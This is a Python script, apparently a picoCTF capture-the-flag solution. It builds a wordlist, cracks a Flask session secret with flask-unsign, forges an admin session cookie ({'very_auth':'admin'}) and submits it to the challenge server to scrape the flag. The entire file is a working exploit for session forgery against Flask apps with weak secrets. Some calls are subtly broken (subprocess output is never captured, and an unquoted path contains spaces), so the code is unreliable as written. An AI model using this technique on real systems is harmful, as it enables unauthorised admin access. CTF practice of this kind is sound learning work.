
# Import Libraries
from bs4 import BeautifulSoup
from subprocess import run
import requests
from pathlib import Path



def pre():
    # Create wordlist
    cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

    with open(str(Path(__file__).parent/'wordlist.txt'), 'w') as F:
        for name in cookie_names:
            F.write(name + "\n")
        F.close()

# core part of exploit
def BF(cookie):
    secret = run(rf"flask-unsign --unsign --cookie {cookie} --wordlist D:\learning\github_clone_repo\CodingLearning\picoCTF\web expliot\Most Cookie\wordlist.txt").stdout
    payload = "\"{'very_auth':'admin'}\""
    sign = run(f"flask-unsign --sign --cookie {payload} --secret {secret}").stdout
    
    print(f"Token: {sign}")
    final_token = sign[:-1]
    return final_token

# Send cookies to website
def result(url, response, token):
    cookies = dict(session=token)
    response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")

    # Retreive flag from page
    flag = soup.select("body > div.container > div.jumbotron > p:nth-child(2)")[0]
    return flag.text

def main():
    # constants
    url = "http://mercury.picoctf.net:44693/"
    session = requests.Session()
    response = session.get(url)
    cookie = session.cookies.get_dict().get('session')
    
    pre()
    print(result(url, response, BF(cookie)))

if __name__ == "__main__":
    main()